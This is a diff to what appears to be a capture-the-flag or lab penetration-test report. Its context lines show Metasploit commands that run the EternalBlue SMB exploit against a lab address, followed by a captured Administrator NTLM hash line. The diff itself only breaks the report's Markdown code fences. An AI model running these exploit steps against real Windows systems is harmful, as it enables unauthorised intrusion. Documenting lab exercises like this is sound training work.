@@ -101,7 +101,8 @@ The assessment followed a standard methodology:
 
 ### A. Exploitation Commands
 
-```bash
+``bash
+
 use exploit/windows/smb/ms17_010_eternalblue
 set RHOSTS 10.10.249.67
 set LHOST tun0
@@ -109,7 +110,7 @@ run
 
 ### B. Captured Hashes
 
-```bash
+`bash
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 
 ###   Collected Flags 
